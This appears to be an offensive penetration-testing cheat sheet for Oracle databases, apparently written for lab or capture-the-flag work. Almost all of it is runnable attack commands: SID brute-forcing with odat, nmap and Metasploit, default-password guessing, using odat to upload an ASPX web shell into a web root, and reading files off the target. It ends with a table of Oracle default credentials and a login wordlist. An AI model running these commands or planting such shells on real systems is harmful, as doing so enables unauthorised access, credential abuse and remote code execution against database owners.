## Oracle DB

### Identify SIDs

```
# using odat
odat sidguesser -s <IP>

# using nmap
nmap -p 1521 --script=oracle-sid-brute.nse,oracle-tns-version.nse <IP>

# using metasploit

## sid bruteforce
msf auxiliary(admin/oracle/sid_brute) > run 

## tns version
auxiliary/scanner/oracle/tnslsnr_version

## sid enum
auxiliary/scanner/oracle/sid_enum

## username enumeration:
use auxiliary/scanner/oracle/oracle_login

## execute sql queries
use auxiliary/admin/oracle/oracle_sql
```

### Identify Users

**NOTE**: If no userspass file is provided with passwordguesser, the default one points to `/usr/share/odat/accounts/accounts.txt`
```
# using odat
odat passwordguesser -s <IP> -d <SID identified in previous step usually XE>
```

### Find vulnerable Modules
```
odat all -s <IP> -d <SID> -U SCOTT -P tiger --sysdba
```

### Upload shell
```
odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx /usr/share/webshells/aspx/cmdasp.aspx

odat utlfile -s 10.129.95.188 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx /usr/share/webshells/aspx/cmdasp.aspx
```

### Get/Read files
```
# note that getFile accepts 3 arguments: RemoteDir, Remote file and local file
odat utlfile -s 10.129.95.188 -d XE -U SCOTT -P tiger --sysdba --getFile C:\\Users\\Phineas\\Desktop\\ user.txt user.txt 
```


### ORACLE DEFAULT ACCOUNTS 

| Username | Password | 
|----------|----------|
| SYSTEM   | MANAGER  |
| SYS      | CHANGE_ON_INSTALL |
| DBSNMP   | DBSNMP   |
| SCOTT    | TIGER    |
| PCMS_SYS | PCMS_SYS |
| WMSYS    | WMSYS    |
| OUTLN    | OUTLN    |

### ORACLE WORDLIST 

**NOTE**: Try lowercase as well.

```
SYSTEM/MANAGER
SYS/CHANGE_ON_INSTALL
DBSNMP/DBSNMP
SCOTT/TIGER
PCMS_SYS/PCMS_SYS
WMSYS/WMSYS
OUTLN/OUTLN
system/manager
sys/change_on_install
dbsnmp/dbsnmp
scott/tiger
pcms_sys/pcms_sys
wmsys/wmsys
outln/outln
```

